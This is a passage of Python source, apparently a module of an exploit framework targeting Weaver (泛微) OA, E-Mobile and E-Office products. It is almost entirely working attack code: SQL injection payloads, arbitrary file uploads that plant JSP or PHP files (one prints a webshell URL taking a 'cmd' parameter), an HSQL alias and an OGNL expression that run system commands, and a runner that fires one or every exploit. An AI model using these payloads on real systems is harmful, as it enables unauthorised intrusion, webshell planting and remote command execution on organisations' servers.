        data = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    )                
                if '[' in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_Weaver_common_ctrl_upload(self):
        appName = 'oa_weaver'
        pocname = 'E_Weaver_common_ctrl_upload'
        method = 'post'
        desc = '[sql injection] 泛微OA weaver.common.Ctrl 任意文件上传 app="泛微-协同办公OA"'
        path = '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
        
        from lib.util.fun import randomLowercase
        mm = randomLowercase(6)
        webshell_name1 = mm + '.jsp'
        webshell_name2 = '../../../' + webshell_name1
        file_zip(mm, webshell_name2, self.flag)
        file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
        
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path,
                    files=file,
                    allow_redirects=False,
                    )                
                r = exprequest.get(
                    url=self.url + '/cloudstore/' + webshell_name1,
                    allow_redirects=False,
                    )
                if self.flag in r.text:
                    print('[+]利用成功webshell地址为: ' + self.url + 'cloudstore/' + webshell_name1+'?cmd=')
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def E_Weaver_uploadOperation_upload(self):
        appName = 'oa_weaver'
        pocname = 'E_Weaver_uploadOperation_upload'
        method = 'post'
        desc = '[sql injection] 泛微OA9前台任意文件上传 app="泛微-协同办公OA"'
        path = '/page/exportImport/uploadOperation.jsp'
        
        from lib.util.fun import randomLowercase
        mm = randomLowercase(6) + '.jsp'
    
        data = '--6aaf12c632ee6febfc354d1ba1bc914b\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--6aaf12c632ee6febfc354d1ba1bc914b--'%(mm,self.flag)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Content-Type': 'multipart/form-data; boundary=6aaf12c632ee6febfc354d1ba1bc914b'
            }
        
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    )                
                r = exprequest.get(
                    url=self.url + '/page/exportImport/fileTransfer/%s'%mm,
                    allow_redirects=False,
                    )
                if self.flag in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_Mobile_hsql_sql_rce(self):
        appName = 'oa_weaver'
        pocname = 'E_Mobile_hsql_sql_rce'
        method = 'post'
        desc = '[sql injection] 泛微OA 参数未过滤,存在注入 hsql数据库可执行Java命令 app="泛微-EMobile"'
        path1 = '/client.do'
        data1 = "method=getupload&uploadID=1';CREATE ALIAS cc8312 AS CONCAT('void e(String cmd) throws java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRn','ntime();rt.ex','ec(cmd);}');CALL cc8312('whoami');select+'1"
        path2 = '/messageType.do'
        data2 = 'method=create&typeName=1\';CREATE ALIAS sleep222 FOR "java.lang.Thread.sleep";CALL sleep222(1000);select+\'1'   
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path1,
                    data=data1,
                    allow_redirects=False,
                    )             
                if 'true' in r.text:
                    return output.echo_success(method, desc)   
                r = exprequest.post(
                    url=self.url+path2,
                    data=data2,
                    allow_redirects=False,
                    )
                if 'true' in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def E_Mobile_authcode_ognl_rce(self):
        appName = 'oa_weaver'
        pocname = 'E_Mobile_authcode_ognl_rce'
        method = 'post'
        desc = '[sql injection] 泛微OA Ognl 表达式注入 CNVD-2017-03561 app="泛微-EMobile"'
        path = '/manager/authcode.do'
        data = 'message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=echo %s'%self.flag
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    )             
                if self.flag in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_Office_OfficeServer_upload_getshell(self):
        appName = 'oa_weaver'
        pocname = 'E_Office_OfficeServer_upload_getshell'
        method = 'post'
        desc = '[upload] 泛微eoffice10前台任意文件上传 app="泛微-EOffice"'
        path = '/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
        
        from lib.util.fun import randomLowercase
        mm = randomLowercase(6) + '.php'
    
        data = '--6aaf12c632ee6febfc354d1ba1bc914b\r\nContent-Disposition: form-data; name="FileData"; filename="test.jpg"\r\nContent-Type: Content-Type: image/jpeg\r\n\r\n%s\r\n--6aaf12c632ee6febfc354d1ba1bc914b\r\nContent-Disposition: form-data; name="FormData"\r\n\r\n{\'USERNAME\':\'\',\'RECORDID\':\'undefined\',\'OPTION\':\'SAVEFILE\',\'FILENAME\':\'%s\'}\r\n--6aaf12c632ee6febfc354d1ba1bc914b--'%(self.flag, mm)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*', 
            'Content-Type': 'multipart/form-data; boundary=6aaf12c632ee6febfc354d1ba1bc914b'
            }
        
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    )                
                r = exprequest.get(
                    url=self.url + '/eoffice10/server/public/iWebOffice2015/Document/%s'%mm,
                    allow_redirects=False,
                    )
                if self.flag in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def E_cology_v9_sql(self):
        appName = 'oa_weaver'
        pocname = 'E_cology_v9_sql'
        method = 'post'
        desc = '[sql] app="泛微-协同办公OA" Ecology9 <=10.55'
        path = '/mobile/%20/plugin/browser.jsp'
        data = r"isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%" \
            "25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36" \
            "%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%3" \
            "6%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%" \
            "36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33" \
            "%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%3" \
            "3%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%" \
            "33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25" \
            "%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%2" \
            "5%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%" \
            "25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35" \
            "%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%3" \
            "5%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%" \
            "35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32" \
            "%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%3" \
            "2%35%25%33%32%25%33%37"
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(url=self.url+path, data=data, allow_redirects=False)                
                if 'SQL_EXISTS' in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

def file_zip(mm, webshell_name2, flag):  
    shell = flag  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def check(**kwargs):
    thread_list = []
    Expoa_weaver = oa_weaver(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expoa_weaver, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(oa_weaver):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expoa_weaver, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)